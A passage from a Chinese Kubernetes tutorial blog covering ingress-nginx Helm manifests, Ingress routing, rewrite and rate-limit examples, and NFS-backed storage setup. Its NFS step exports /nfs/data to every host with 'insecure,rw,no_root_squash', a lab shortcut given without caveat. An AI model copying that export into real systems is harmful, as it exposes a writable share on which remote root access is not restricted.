class="string">admissionregistration.k8s.io</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">validatingwebhookconfigurations</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">get</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">update</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/admission-webhooks/job-patch/clusterrolebinding.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx-admission</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">helm.sh/hook:</span> <span class="string">pre-install,pre-upgrade,post-install,post-upgrade</span></span><br><span class="line">    <span class="attr">helm.sh/hook-delete-policy:</span> <span class="string">before-hook-creation,hook-succeeded</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">admission-webhook</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx-admission</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ingress-nginx-admission</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/admission-webhooks/job-patch/role.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx-admission</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">helm.sh/hook:</span> <span class="string">pre-install,pre-upgrade,post-install,post-upgrade</span></span><br><span class="line">    <span class="attr">helm.sh/hook-delete-policy:</span> <span class="string">before-hook-creation,hook-succeeded</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">admission-webhook</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">secrets</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">get</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">create</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/admission-webhooks/job-patch/rolebinding.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx-admission</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">helm.sh/hook:</span> <span class="string">pre-install,pre-upgrade,post-install,post-upgrade</span></span><br><span class="line">    <span class="attr">helm.sh/hook-delete-policy:</span> <span class="string">before-hook-creation,hook-succeeded</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">admission-webhook</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx-admission</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ingress-nginx-admission</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/admission-webhooks/job-patch/job-createSecret.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">batch/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Job</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx-admission-create</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">helm.sh/hook:</span> <span class="string">pre-install,pre-upgrade</span></span><br><span class="line">    <span class="attr">helm.sh/hook-delete-policy:</span> <span class="string">before-hook-creation,hook-succeeded</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">admission-webhook</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">ingress-nginx-admission-create</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">        <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">        <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">        <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">        <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">        <span class="attr">app.kubernetes.io/component:</span> <span class="string">admission-webhook</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">docker.io/jettech/kube-webhook-certgen:v1.5.1</span></span><br><span class="line">          <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">          <span class="attr">args:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">create</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--host=ingress-nginx-controller-admission,ingress-nginx-controller-admission.$(POD_NAMESPACE).svc</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--namespace=$(POD_NAMESPACE)</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--secret-name=ingress-nginx-admission</span></span><br><span class="line">          <span class="attr">env:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">POD_NAMESPACE</span></span><br><span class="line">              <span class="attr">valueFrom:</span></span><br><span class="line">                <span class="attr">fieldRef:</span></span><br><span class="line">                  <span class="attr">fieldPath:</span> <span class="string">metadata.namespace</span></span><br><span class="line">      <span class="attr">restartPolicy:</span> <span class="string">OnFailure</span></span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">ingress-nginx-admission</span></span><br><span class="line">      <span class="attr">securityContext:</span></span><br><span class="line">        <span class="attr">runAsNonRoot:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">runAsUser:</span> <span class="number">2000</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/admission-webhooks/job-patch/job-patchWebhook.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">batch/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Job</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx-admission-patch</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">helm.sh/hook:</span> <span class="string">post-install,post-upgrade</span></span><br><span class="line">    <span class="attr">helm.sh/hook-delete-policy:</span> <span class="string">before-hook-creation,hook-succeeded</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">admission-webhook</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">ingress-nginx-admission-patch</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">        <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">        <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">        <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">        <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">        <span class="attr">app.kubernetes.io/component:</span> <span class="string">admission-webhook</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">patch</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">docker.io/jettech/kube-webhook-certgen:v1.5.1</span></span><br><span class="line">          <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">          <span class="attr">args:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">patch</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--webhook-name=ingress-nginx-admission</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--namespace=$(POD_NAMESPACE)</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--patch-mutating=false</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--secret-name=ingress-nginx-admission</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--patch-failure-policy=Fail</span></span><br><span class="line">          <span class="attr">env:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">POD_NAMESPACE</span></span><br><span class="line">              <span class="attr">valueFrom:</span></span><br><span class="line">                <span class="attr">fieldRef:</span></span><br><span class="line">                  <span class="attr">fieldPath:</span> <span class="string">metadata.namespace</span></span><br><span class="line">      <span class="attr">restartPolicy:</span> <span class="string">OnFailure</span></span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">ingress-nginx-admission</span></span><br><span class="line">      <span class="attr">securityContext:</span></span><br><span class="line">        <span class="attr">runAsNonRoot:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">runAsUser:</span> <span class="number">2000</span></span><br></pre></td></tr></table></figure>

<h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">官网地址：https://kubernetes.github.io/ingress-nginx/就是nginx做的</span><br></pre></td></tr></table></figure>

<p><a href="https://139.198.163.211:32401/">https://139.198.163.211:32401/</a></p>
<p><a href="https://139.198.163.211:32401/">http://139.198.163.211:31405/</a></p>
<h5 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h5><p><code>应用如下yaml，准备好测试环境</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">hello-server</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">hello-server</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">hello-server</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">hello-server</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images/hello-server</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">9000</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx-demo</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-demo</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx-demo</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx-demo</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx-demo</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-demo</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx-demo</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">8000</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">80</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">hello-server</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">hello-server</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">hello-server</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">8000</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">9000</span></span><br></pre></td></tr></table></figure>

<h5 id="①域名访问"><a href="#①域名访问" class="headerlink" title="①域名访问"></a>①域名访问</h5><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span>  </span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-host-bar</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">ingressClassName:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">host:</span> <span class="string">&quot;hello.atguigu.com&quot;</span></span><br><span class="line">    <span class="attr">http:</span></span><br><span class="line">      <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">pathType:</span> <span class="string">Prefix</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">        <span class="attr">backend:</span></span><br><span class="line">          <span class="attr">service:</span></span><br><span class="line">            <span class="attr">name:</span> <span class="string">hello-server</span></span><br><span class="line">            <span class="attr">port:</span></span><br><span class="line">              <span class="attr">number:</span> <span class="number">8000</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">host:</span> <span class="string">&quot;demo.atguigu.com&quot;</span></span><br><span class="line">    <span class="attr">http:</span></span><br><span class="line">      <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">pathType:</span> <span class="string">Prefix</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">&quot;/nginx&quot;</span>  <span class="comment"># 把请求会转给下面的服务，下面的服务一定要能处理这个路径，不能处理就是404</span></span><br><span class="line">        <span class="attr">backend:</span></span><br><span class="line">          <span class="attr">service:</span></span><br><span class="line">            <span class="attr">name:</span> <span class="string">nginx-demo</span>  <span class="comment">## java，比如使用路径重写，去掉前缀nginx</span></span><br><span class="line">            <span class="attr">port:</span></span><br><span class="line">              <span class="attr">number:</span> <span class="number">8000</span></span><br></pre></td></tr></table></figure>

<p><code>问题： path: &quot;/nginx&quot; 与  path: &quot;/&quot; 为什么会有不同的效果？</code></p>
<h5 id="②路径重写"><a href="#②路径重写" class="headerlink" title="②路径重写"></a>②路径重写</h5><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span>  </span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">nginx.ingress.kubernetes.io/rewrite-target:</span> <span class="string">/$2</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-host-bar</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">ingressClassName:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">host:</span> <span class="string">&quot;hello.atguigu.com&quot;</span></span><br><span class="line">    <span class="attr">http:</span></span><br><span class="line">      <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">pathType:</span> <span class="string">Prefix</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">        <span class="attr">backend:</span></span><br><span class="line">          <span class="attr">service:</span></span><br><span class="line">            <span class="attr">name:</span> <span class="string">hello-server</span></span><br><span class="line">            <span class="attr">port:</span></span><br><span class="line">              <span class="attr">number:</span> <span class="number">8000</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">host:</span> <span class="string">&quot;demo.atguigu.com&quot;</span></span><br><span class="line">    <span class="attr">http:</span></span><br><span class="line">      <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">pathType:</span> <span class="string">Prefix</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">&quot;/nginx(/|$)(.*)&quot;</span>  <span class="comment"># 把请求会转给下面的服务，下面的服务一定要能处理这个路径，不能处理就是404</span></span><br><span class="line">        <span class="attr">backend:</span></span><br><span class="line">          <span class="attr">service:</span></span><br><span class="line">            <span class="attr">name:</span> <span class="string">nginx-demo</span>  <span class="comment">## java，比如使用路径重写，去掉前缀nginx</span></span><br><span class="line">            <span class="attr">port:</span></span><br><span class="line">              <span class="attr">number:</span> <span class="number">8000</span></span><br><span class="line">              </span><br></pre></td></tr></table></figure>

<h5 id="③流量限制"><a href="#③流量限制" class="headerlink" title="③流量限制"></a>③流量限制</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apiVersion: networking.k8s.io/v1</span><br><span class="line">kind: Ingress</span><br><span class="line">metadata:</span><br><span class="line">  name: ingress-limit-rate</span><br><span class="line">  annotations:</span><br><span class="line">    nginx.ingress.kubernetes.io/limit-rps: <span class="string">&quot;1&quot;</span></span><br><span class="line">spec:</span><br><span class="line">  ingressClassName: nginx</span><br><span class="line">  rules:</span><br><span class="line">  - host: <span class="string">&quot;haha.atguigu.com&quot;</span></span><br><span class="line">    http:</span><br><span class="line">      paths:</span><br><span class="line">      - pathType: Exact</span><br><span class="line">        path: <span class="string">&quot;/&quot;</span></span><br><span class="line">        backend:</span><br><span class="line">          service:</span><br><span class="line">            name: nginx-demo</span><br><span class="line">            port:</span><br><span class="line">              number: 8000</span><br></pre></td></tr></table></figure>

<h3 id="七-存储抽象类"><a href="#七-存储抽象类" class="headerlink" title="七.存储抽象类"></a>七.存储抽象类</h3><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><h5 id="1-所有节点"><a href="#1-所有节点" class="headerlink" title="1.所有节点"></a>1.所有节点</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#所有机器安装</span></span><br><span class="line">yum install -y nfs-utils</span><br></pre></td></tr></table></figure>

<h5 id="2-主节点"><a href="#2-主节点" class="headerlink" title="2.主节点"></a>2.主节点</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#nfs主节点</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/nfs/data/ *(insecure,rw,sync,no_root_squash)&quot;</span> &gt; /etc/exports</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /nfs/data</span><br><span class="line">systemctl <span class="built_in">enable</span> rpcbind --now</span><br><span class="line">systemctl <span class="built_in">enable</span> nfs-server --now</span><br><span class="line"><span class="comment">#配置生效</span></span><br><span class="line">exportfs -r</span><br></pre></td></tr></table></figure>

<h5 id="3-从节点"><a href="#3-从节点" class="headerlink" title="3.从节点"></a>3.从节点</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">showmount -e 172.31.0.4</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行以下命令挂载 nfs 服务器上的共享目录到本机路径 /root/nfsmount</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /nfs/data</span><br><span class="line"></span><br><span class="line">mount -t nfs 172.31.0.4:/nfs/data /nfs/data</span><br><span class="line"><span class="comment"># 写入一个测试文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello nfs server&quot;</span> &gt; /nfs/data/test.txt</span><br></pre></td></tr></table></figure>

<h5 id="4-原生方式数据挂载"><a href="#4-原生方式数据挂载" class="headerlink" title="4.原生方式数据挂载"></a>4.原生方式数据挂载</h5><p><code>弊端：无法指定分配大小</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx-pv-demo</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-pv-demo</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx-pv-demo</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx-pv-demo</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">html</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/usr/share/nginx/html</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">html</span></span><br><span class="line">          <span class="attr">nfs:</span></span><br><span class="line">            <span class="attr">server:</span> <span class="number">172.31</span><span class="number">.0</span><span class="number">.4</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/nfs/data/nginx-pv</span></span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<h4 id="1-PV-PVC"><a href="#1-PV-PVC" class="headerlink" title="1.PV&amp;PVC"></a>1.PV&amp;PVC</h4><p><code>PV:持久卷(Persistent Volume),将应用需要持久化的数据保存到指定位置</code></p>
<p><code>PVC: 持久卷声明(Persistent Volume Claim),声明需要使用的持久卷规格</code></p>
<h5 id="①-创建pv池"><a href="#①-创建pv池" class="headerlink" title="①.创建pv池"></a>①.创建pv池</h5><p><code>静态供应</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#nfs主节点</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /nfs/data/01</span><br><span class="line"><span class="built_in">mkdir</span> -p /nfs/data/02</span><br><span class="line"><span class="built_in">mkdir</span> -p /nfs/data/03</span><br></pre></td></tr></table></figure>

<p><code>创建PV</code></p>
